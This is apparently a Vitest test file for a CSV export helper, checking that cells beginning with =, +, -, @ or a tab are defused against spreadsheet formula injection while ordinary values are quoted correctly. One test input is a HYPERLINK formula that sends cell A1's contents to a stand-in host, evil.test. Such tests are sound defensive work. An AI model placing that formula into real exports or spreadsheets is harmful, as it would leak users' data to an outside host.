import { describe, expect, it } from "vitest";
import { csvCell, toCsv } from "./csv";

describe("csvCell", () => {
  it("defuses anything a spreadsheet would run as a formula", () => {
    expect(csvCell("=HYPERLINK(\"http://evil.test?\"&A1,\"click\")")).toBe(`"'=HYPERLINK(""http://evil.test?""&A1,""click"")"`);
    expect(csvCell("+1+1")).toBe("'+1+1");
    expect(csvCell("-2+3")).toBe("'-2+3");
    expect(csvCell("@SUM(A1:A9)")).toBe("'@SUM(A1:A9)");
    expect(csvCell("\t=1")).toBe("'\t=1");
  });

  it("leaves ordinary text, numbers and dates alone", () => {
    expect(csvCell("Acme Robotics")).toBe("Acme Robotics");
    expect(csvCell("a friend, at an event")).toBe(`"a friend, at an event"`);
    expect(csvCell(1200.5)).toBe("1200.5");
    expect(csvCell("-120.50")).toBe("-120.50");
    expect(csvCell("1200.00")).toBe("1200.00");
    expect(csvCell(null)).toBe("");
    expect(csvCell(new Date("2026-03-01T00:00:00Z"))).toBe("2026-03-01T00:00:00.000Z");
    expect(csvCell("she said \"hi\"")).toBe(`"she said ""hi"""`);
  });

  it("writes a header and CRLF rows", () => {
    expect(toCsv([{ a: 1, b: "=x" }], ["a", "b"])).toBe("a,b\r\n1,'=x");
  });
});
